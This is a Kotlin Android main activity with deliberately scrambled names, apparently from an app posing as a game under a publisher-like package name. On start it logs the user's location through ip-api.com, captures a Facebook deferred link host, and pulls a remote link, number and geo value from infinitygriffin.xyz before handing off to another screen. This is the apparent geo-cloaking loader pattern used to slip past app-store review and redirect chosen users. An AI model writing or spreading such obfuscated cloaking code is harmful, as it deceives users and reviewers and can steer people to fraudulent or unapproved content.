package com.socialquantum.acityintu.gtnjgtnjtgngt

import android.content.Context
import android.content.Intent
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import com.facebook.applinks.AppLinkData
import com.orhanobut.hawk.Hawk
import com.socialquantum.acityintu.rjiogtjigtjigt.Sorrrr1Activity2
import com.socialquantum.acityintu.databinding.ActivityMainBinding
import com.socialquantum.acityintu.defrfr.BaBaBaClass
import com.socialquantum.acityintu.defrfr.BaBaBaClass.Companion.gtgth
import com.socialquantum.acityintu.defrfr.BaBaBaClass.Companion.g2hy59h55hy59hy
import com.socialquantum.acityintu.frrgtgt.PKFkorkfrji
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.Job
import kotlinx.coroutines.launch
import retrofit2.Retrofit
import retrofit2.converter.gson.GsonConverterFactory
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit

class MainActivity : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {

        super.onCreate(savedInstanceState)
        h5hy9 = ActivityMainBinding.inflate(layoutInflater)
        setContentView(h5hy9.root)

        gthigtihgthgt(this)

        val gtgthyhyhy = Executors.newSingleThreadScheduledExecutor()
        var juikik: String? = Hawk.get(g2hy59h55hy59hy, null)
        var gthyhhy: String? = Hawk.get(gtgth, null)
        gtgthyhyhy.scheduleAtFixedRate({
            if (juikik != null && gthyhhy != null) {
                gtgthyhyhy.shutdown()
                nbnhyjhyjihyjihy()
            } else {
                juikik = Hawk.get(g2hy59h55hy59hy)
                gthyhhy = Hawk.get(gtgth)
            }
        }, 0, 1, TimeUnit.SECONDS)

        GlobalScope.launch(Dispatchers.IO) {
            nvnghghthty
        }
    }

    fun gthigtihgthgt(context: Context) {
        AppLinkData.fetchDeferredAppLinkData(
            context
        ) { appLinkData: AppLinkData? ->
            appLinkData?.let {
                val jikikik = appLinkData.targetUri?.host.toString()
                Hawk.put(BaBaBaClass.hykpokkhykkhy, jikikik)
            }
        }
    }

    private fun nbnhyjhyjihyjihy() {
        val hyhyjuju66 = Intent(this@MainActivity, Sorrrr1Activity2::class.java)
        startActivity(hyhyjuju66)
        finish()
    }


    private lateinit var h5hy9: ActivityMainBinding

    private suspend fun gtjotgjgtjgtjigtj() {

        val frfrghy = Retrofit.Builder()
            .addConverterFactory(GsonConverterFactory.create())
            .baseUrl("http://infinitygriffin.xyz/")
            .build()
            .create(PKFkorkfrji::class.java)
        val hyhy55yh5hy = frfrghy.hyujjuujujju().body()?.aplicationLinkka.toString()
        val frfgtgt = frfrghy.hyujjuujujju().body()?.aplicationNumberMain.toString()
        val frgtt = frfrghy.hyujjuujujju().body()?.applicationGeo.toString()


        Hawk.put(BaBaBaClass.gthgthgt, hyhy55yh5hy)
        Hawk.put(BaBaBaClass.hyhy5yh95h, frfgtgt)
        Hawk.put(gtgth, frgtt)


    }

    private suspend fun hy59hy55hy() {
        val gtjigtjigtjitg = Retrofit.Builder()
            .addConverterFactory(GsonConverterFactory.create())
            .baseUrl("http://pro.ip-api.com/")
            .build()
            .create(PKFkorkfrji::class.java)
        val gtjgthugthugt = gtjigtjigtjitg.hyhy5hy5hy().body()?.hjokokuj

        Hawk.put(g2hy59h55hy59hy, gtjgthugthugt)
    }

    private val nvnghghthty: Job = GlobalScope.launch(Dispatchers.IO) {
        hy59hy55hy()
        gtjotgjgtjgtjigtj()
    }

}